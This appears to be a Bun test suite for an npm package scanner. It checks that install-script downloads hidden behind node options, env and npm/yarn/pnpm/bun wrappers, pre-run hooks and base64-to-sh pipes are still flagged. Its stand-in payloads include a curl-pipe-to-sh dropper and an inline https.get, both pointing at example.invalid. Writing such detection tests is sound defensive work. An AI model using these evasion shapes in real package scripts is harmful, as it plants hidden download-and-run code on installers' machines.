// Shapes that kept an install script's payload out of view though the same payload written plainly was read: node
// options whose value is the next word, wrappers and assignments before npm, yarn, pnpm and bun runs, a script the
// baseline walk already read, a file the reading plan passed over. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, expandHooks, finalize, isInlineDownload, planLayers, type AnalyzeInput, type TarEntry } from "../src/index.ts";

const enc = new TextEncoder();
const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
const DROPPER = "curl -s https://example.invalid/x.sh | sh";
const NET = `"require('https').get('https://example.invalid/x')"`;

function scoreOf(manifest: Partial<AnalyzeInput["manifest"]>, files: TarEntry[] = []) {
  const m = { name: "probe-pkg", version: "1.0.0", license: "MIT", ...manifest };
  const a = analyze({ name: "probe-pkg", manifest: m, files: [file("package.json", JSON.stringify(m)), ...files], publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

describe("node's option values are one word each", () => {
  for (const cmd of [
    `node --conditions dev -e ${NET}`,
    `node -C dev -p ${NET}`,
    `node -r ./x.js -e ${NET}`,
    `node --redirect-warnings file -e ${NET}`,
    `node --conditions 'a b' -e ${NET}`,
    `node --title t --no-warnings --import ./y.mjs --eval ${NET}`,
    `FOO=1 node -C dev -e ${NET}`,
    `echo "$(node -C dev -e ${NET})"`,
  ]) {
    test(`${cmd} runs inline code`, () => {
      expect(isInlineDownload(cmd)).toBe(true);
      expect(scoreOf({ scripts: { postinstall: cmd } }).ids).toContain("install-download");
    });
  }

  for (const cmd of [
    `node -C dev main.js -e ${NET}`,
    `node -C dev --version -e ${NET}`,
    `node -C dev -v -e ${NET}`,
    `node -C dev --v8_options -e ${NET}`,
    `node -C dev --check -e ${NET}`,
    `node -C dev -e ${NET} --version`,
    `node -C dev -e "$(printf x)" --help=true`,
    `node -C dev -- -e ${NET}`,
    `node -C "$X" -e ${NET}`,
    `node --unknown-option dev -e ${NET}`,
  ]) {
    test(`${cmd} runs no inline code`, () => {
      expect(isInlineDownload(cmd)).toBe(false);
    });
  }
});

describe("a run behind a wrapper, an assignment or another manager is followed", () => {
  for (const cmd of [
    "env 'npm' run payload",
    "FOO=1 'npm' run payload",
    "env -i FOO=1 npm run '-s' payload",
    "command npm run '-s' payload",
    "exec npm run '-s' payload",
    "nice -n 5 npm run '-s' payload",
    "npx --yes npm run '-s' payload",
    "cross-env A=1 npm run '-s' payload",
    "xargs -I{} npm run '-s' payload",
    "if true; then npm run '-s' payload; fi",
    "yarn '--silent' payload",
    "yarn run '-s' payload",
    "pnpm run '-s' payload",
    "pnpm '--if-present' payload",
    "bun run '--silent' payload",
    "npm run '-s' payload -- args",
  ]) {
    test(cmd, () => {
      const scripts = { postinstall: cmd, payload: DROPPER };

      expect(expandHooks({ scripts })[0]?.scripts).toContain("payload");
      expect(scoreOf({ scripts }).ids).toContain("install-download");
    });
  }

  test("pre and post scripts run unless npm sets ignore-scripts, and yarn, pnpm and bun run them too", () => {
    expect(expandHooks({ scripts: { postinstall: "env npm run '--ignore-scripts' payload", prepayload: DROPPER, payload: "true" } })[0]?.scripts).not.toContain("prepayload");
    expect(expandHooks({ scripts: { postinstall: "env npm run '-s' payload", prepayload: DROPPER, payload: "true" } })[0]?.scripts).toContain("prepayload");
    expect(expandHooks({ scripts: { postinstall: "yarn run '-s' payload", prepayload: DROPPER, payload: "true" } })[0]?.scripts).toContain("prepayload");
  });

  test("a wrapper that runs something else, or a name the shell builds, follows nothing", () => {
    for (const cmd of ["command -v npm run '-s' payload", "env -S 'npm run payload'", "exec -a x npm run '-s' payload", "xargs -I{} npm run '-s' {}", "bun '--silent' payload", "yarn '--cwd' x payload", "echo | xargs npm run '-s' payload", "env npm run '-s' payload '--prefix' x", "yarn '-s' payload --cwd x"]) {
      expect(expandHooks({ scripts: { postinstall: cmd, payload: DROPPER } })[0]?.scripts).not.toContain("payload");
    }
  });
});

describe("what only the shell reading runs gets its install-time checks", () => {
  test("a shell script the baseline walk already read is still a download when an added run runs it", () => {
    const setup = file("setup.sh", `#!/bin/sh\n${DROPPER}\n`);

    expect(scoreOf({ main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "sh ./setup.sh" } }, [file("index.js", "1;\n"), setup]).ids).toContain("install-download");
  });

  test("a file the plan passed over as not holdable is held once an added run runs it", () => {
    const run = btoa("node ./payload.so");
    const manifest = { name: "probe-pkg", version: "1.0.0", main: "index.js", scripts: { postinstall: "npm run '-s' x", x: `echo '${run}' | base64 -d | sh` } };
    const files = [file("index.js", "require('./payload.so');\n"), file("payload.so", "require('https').get('https://example.invalid/x');\n")];
    const plan = planLayers({ manifest, files, imports: new Map([["index.js", ["./payload.so"]]]), budget: 100000 });

    expect([...plan.production, ...plan.extra]).toContain("payload.so");
  });
});
